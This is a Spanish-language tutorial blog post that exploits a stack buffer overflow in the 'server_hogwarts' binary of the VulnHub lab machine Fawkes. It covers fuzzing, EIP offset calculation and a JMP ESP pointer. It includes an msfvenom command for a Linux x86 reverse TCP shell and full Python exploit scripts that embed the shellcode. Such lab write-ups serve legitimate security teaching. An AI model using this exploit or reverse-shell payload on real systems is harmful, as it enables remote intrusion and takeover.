---
title: "Buffer Overflow X86"
date: 2024-01-03T15:16:01-03:00
categories: ["Fundamentos"]
tags: ["Buffer Overflow x86", "Linux"]
---

> El buffer overflow que explotaremos se encuentra presente en el binario `server_hogwarts` de la máquina [Fawkes](https://www.vulnhub.com/entry/harrypotter-fawkes,686/) de VulnHub.
{: .prompt-info }

## Fase inicial de Fuzzing y tomando el control del registro EIP

Ejecutamos el binario, el cual corre un servidor que expone una aplicación de consola.

![Execution Server](/assets/img/bof/execution-server.png)

> Para conocer el puerto en el cual esta corriendo la aplicación podemos hacer uso de la utilidad `strace ./server_hogwarts`
>
> El comando `strace` es una herramienta de línea de comandos en sistemas basados en Unix y Linux que se utiliza para realizar un seguimiento de las llamadas al sistema y las señales que realiza un programa durante su ejecución. Ayuda a diagnosticar problemas de rendimiento, depurar programas y entender su comportamiento interactuando con el sistema operativo a un nivel más bajo.
>
> En este caso, estamos trazando todas las llamadas al sistema que realiza el binario `server_hogwarts`. Esto incluiría la apertura y cierre de archivos, la comunicación de red, la asignación y liberación de memoria, entre otras operaciones de bajo nivel.
>
> El resultado de `strace` es bastante detallado y puede proporcionar mucha información. Puedes utilizarse para entender cómo se comporta un programa en términos de interacción con el sistema operativo, identificar posibles problemas de rendimiento o depurar problemas específicos.
{: .prompt-tip }

![strace](/assets/img/bof/strace.png)

Como podemos ver, el binario esta corriendo en el puerto `9898`.

Nos conectamos utilizando el comando `nc`

![Connect to App](/assets/img/bof/connect-to-app.png)

Al conectarnos, se nos despliega una aplicación de consola con un menú solicitando que ingresemos algunas de las opciones.

En este punto, lo que haremos para probar si estamos frente a un posible buffer overflow es ingresar un número considerado de `A's` en el campo de entrada.

![Check Overflow](/assets/img/bof/check-overflow.png)

Vemos que al ingresar este valor, la aplicación corrompe lanzando como error `segmentation fault`, lo cual indica que estamos frente a un buffer overflow.

![Segmentation Fault](/assets/img/bof/segmentation-fault.png)

Vamos a hacer un poco de debugging para lo cual ejecutamos el binario usando `gdb`.

![Segmentation Fault](/assets/img/bof/run-server-with-gdb.png)

Nos conectamos otra vez al la aplicación e ingresamos nuevamente `A's` como valor.

Si miramos en gdb, podemos observar que hemos sobrescrito el registro **EIP** con nuestras `A's` que en hexadecimal corresponde a `0x41414141`.

![Segmentation Fault](/assets/img/bof/gdb-debugging.png)

El siguiente paso, es poder tomar el control del registro **EIP** para poder indicarle la dirección de memoria donde se encuentra nuestro shellcode. Para lo cual, vamos a hacer uso de `gdb` ejecutando el comando `pattern create 1000`. Este comando, generará una secuencia de patrón específica que utilizaremos para identificar el desplazamiento (offset).

![Pattern Create](/assets/img/bof/pattern-create.png)

Corremos nuevamente el programa con `gdb` y nos conectamos a la aplicación, pero en lugar de ingresar `A's` insertamos nuestro payload.

![EIP Overwrite](/assets/img/bof/eip-overwrite.png)

La aplicación corrompe nuevamente y ahora el **EIP** vale `AA8A`.

Podemos contar de forma manual cuantos caracteres hay antes de `AA8A` en nuestro payload, lo cual determinará el offset o podemos hacer uso del comando `pattern offset` de `gdb`.

![Calculate offset](/assets/img/bof/calculate-offset.png)

![Pattern offset](/assets/img/bof/pattern-offset.png)

El offset, es decir, la cantidad de caracteres que debemos ingresar para que la aplicación falle son `112`. Podemos comprobar esto ingresando el siguiente payload.

```bash
d4redevil@kali:~$ python3 -c "print('A' * 112 + 'B' * 4 + 'C' * 200)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

![EIP Overwrite BBBB](/assets/img/bof/eip-overwrite-BBBB.png)

Observamos que el **EIP** ahora apunta a la dirección `0x42424242` que corresponde a nuestras `B's`. En otras palabaras, estamos sobreescribiendo el registro **EIP**.

También podemos ver, que el registro **ESP** almacena nuestras `C's` ingresadas en el payload, el cual es el siguiente registro después del **EIP** que se sobreescribe.

![Overwrite ESP with C](/assets/img/bof/overwrite-esp-C.png)

Entonces, lo que debemos hacer a continuación es buscar la dirección de memoria que nos permita apuntar al ESP, en donde se encontrará nuestro shellcode.

Para hacer esto, debemos buscar la instrucción `JMP ESP` que corresponde en hexadecimal a `ffe4`.

## Pointer (JMP ESP)

Para buscar la dirección de memoria que ejecute esta instrucción, podemos hacer uso de la utilidad `objdump`.

![JMP ESP](/assets/img/bof/jmp-esp-1.png)

Como podes ver, la dirección de memoria que apunta a la instrucción `jmp esp` es `0x08049d55`.

> El comando `objdump` es una herramienta de línea de comandos que se utiliza para mostrar información detallada sobre archivos binarios, como ejecutables y bibliotecas. El uso típico incluye la visualización del código ensamblador, secciones, símbolos y otros detalles del archivo binario.
{: .prompt-info }

`-D`: La opción que indica a `objdump` que muestre el código ensamblador (disassembled code).

## ShellCode

Como ultimo punto, solo resta generar nuestro shellcode. Para ello utilizaremos `msfvenom` indicando como payload `linux/x86/shell_reverse_tcp` de la siguiente forma:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.14 LPORT=4444 EXITFUNC=thread -b "\x00" -f python -v shellcode
```

- **`msfvenom`**: Este es el comando principal de la herramienta `msfvenom` en Metasploit, que se utiliza para la generación de payloads.
- **`-p linux/x86/shell_reverse_tcp`**: Especifica el tipo de payload que se generará. En este caso, es un reverse shell de TCP para sistemas Linux con arquitectura x86.
- **`LHOST=192.168.1.14`**: Especifica la dirección IP del host que escuchará las conexiones del payload. En este caso, `192.168.1.14` es la dirección IP del host que recibirá la conexión inversa.
- **`LPORT=4444`**: Especifica el puerto en el que el payload enviará la conexión inversa. En este caso, `4444` es el puerto utilizado.
- **`EXITFUNC=thread`**: Indica la función que se utilizará para la salida del programa cuando el payload finalice. En este caso, se utiliza `thread` como método de salida.
- **`-b "\x00"`**: Especifica los bytes prohibidos o badchars que no deben incluirse en el shellcode. En este caso, se están excluyendo los bytes `\x00` (bytes nulos).
- **`-f python`**: Especifica el formato de salida del payload. En este caso, el formato del payload es Python.
- **`-v shellcode`**: Indica que la salida deseada es el shellcode (código máquina) generado por `msfvenom`, y se almacena en una variable llamada `shellcode`.

![msfvenom Linux payload](/assets/img/bof/msfvenom-linux-payload.png)

## Creación del exploit

Antes de continuar, representemos todos estos datos en un script de python que será nuestro exploit.

```python
#!/usr/bin/python3
import socket

ip = "192.168.1.101" #cambiar la IP por la que corresponda
port = 9898

offset = 112
before_eip = b"A" * 112
eip = b'\x55\x9d\x04\x08' # 0x08049d55 jmp ESP

shellcode =  b""
shellcode += b"\xba\xae\x9a\x58\xac\xd9\xc4\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x12\x31\x56\x12\x83\xc6\x04"
shellcode += b"\x03\xf8\x94\xba\x59\x35\x72\xcd\x41\x66\xc7"
shellcode += b"\x61\xec\x8a\x4e\x64\x40\xec\x9d\xe7\x32\xa9"
shellcode += b"\xad\xd7\xf9\xc9\x87\x5e\xfb\xa1\xd7\x09\xfa"
shellcode += b"\x3f\xb0\x4b\xfd\x2e\x1c\xc5\x1c\xe0\xfa\x85"
shellcode += b"\x8f\x53\xb0\x25\xb9\xb2\x7b\xa9\xeb\x5c\xea"
shellcode += b"\x85\x78\xf4\x9a\xf6\x51\x66\x32\x80\x4d\x34"
shellcode += b"\x97\x1b\x70\x08\x1c\xd1\xf3"

nops = b'\x90' * 32

after_eip = nops + shellcode

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip, port))

s.send(payload)

s.close()
```

Como estamos frente a una arquitectura x86 las direcciones de memoria deben representarse en **little-endian**, es decir, el valor de nuestra variable `eip` que corresponde a la instrucción `JMP ESP` debe representarse de la siguiente forma:

```python
eip = '\x55\x9d\x04\x08'
```

## Uso de NOPs

Una vez que se ha encontrado la dirección del opcode que aplica el salto al registro **ESP**, es posible que el shellcode no sea interpretado correctamente debido a que su ejecución puede requerir más tiempo del que el procesador tiene disponible antes de continuar con la siguiente instrucción del programa.

Para solucionar este problema, se suelen utilizar técnicas como la introducción de **NOPS** (**instrucciones de no operación**) antes del shellcode en la pila. Los NOPS no realizan ninguna operación, pero permiten que el procesador tenga tiempo adicional para interpretar el shellcode antes de continuar con la siguiente instrucción del programa.

Los nops en hexadecimal se representan como `\x90`

![nasm_shell](/assets/img/bof/nasm_shell_nop.png)

En nuestro script, utilizaremos un total de 32 nops lo cual otorgará suficiente tiempo al procesador para ejecutar nuestro shellcode.

## Exploit final

El exploit final quedaría de la siguiente forma:

```python
#!/usr/bin/python3

import socket

ip = "192.168.1.101"
port = 9898

offset = 112
before_eip = b"A" * 112
eip = b'\x55\x9d\x04\x08' # 0x08049d55 jmp ESP

shellcode =  b""
shellcode += b"\xba\xae\x9a\x58\xac\xd9\xc4\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x12\x31\x56\x12\x83\xc6\x04"
shellcode += b"\x03\xf8\x94\xba\x59\x35\x72\xcd\x41\x66\xc7"
shellcode += b"\x61\xec\x8a\x4e\x64\x40\xec\x9d\xe7\x32\xa9"
shellcode += b"\xad\xd7\xf9\xc9\x87\x5e\xfb\xa1\xd7\x09\xfa"
shellcode += b"\x3f\xb0\x4b\xfd\x2e\x1c\xc5\x1c\xe0\xfa\x85"
shellcode += b"\x8f\x53\xb0\x25\xb9\xb2\x7b\xa9\xeb\x5c\xea"
shellcode += b"\x85\x78\xf4\x9a\xf6\x51\x66\x32\x80\x4d\x34"
shellcode += b"\x97\x1b\x70\x08\x1c\xd1\xf3"

nops = b'\x90' * 32

after_eip = nops + shellcode

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect to the server
s.connect((ip, port))

# send the payload
s.send(payload)

s.close()
```

De esta forma, llegamos al final del post.

Espero que los conceptos y la metodología para realizar la explotación de un buffer overflow de estas caracteristicas, hayan quedado claros. Como siempre, si has llegado hasta este punto y aún tienes dudas, te recomiendo volver a leer el post y practicar.

Gracias por tu lectura!

Happy Hacking!
